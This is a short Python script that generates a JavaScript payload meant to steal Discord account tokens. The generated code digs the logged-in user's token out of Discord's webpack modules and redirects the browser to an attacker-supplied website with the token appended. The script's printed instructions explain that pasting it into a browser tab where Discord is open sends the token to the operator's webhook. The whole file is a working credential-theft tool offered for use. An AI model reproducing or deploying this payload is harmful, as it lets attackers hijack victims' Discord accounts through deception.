import base64
from os import system

website = input("Your website link: ")
message_bytes = website.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
first_half = base64_bytes.decode('ascii')

payload = f"""
function base64Decode(encodedString) {{
  return atob(encodedString);
}}

const encodedString = '{first_half}';
const decodedString = base64Decode(encodedString);

var f = (webpackChunkdiscord_app.push([[''], {{}}, e => {{
  m = [];
  for (let c in e.c) m.push(e.c[c]);
}}]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();

window.location.replace(decodedString + '/' + f);
"""

system("cls")
print("Copy the payload. If you paste it into your browser while Discord is open in the tab and you are logged in, your token will be sent to your webhook.\n")
print(payload)
input()
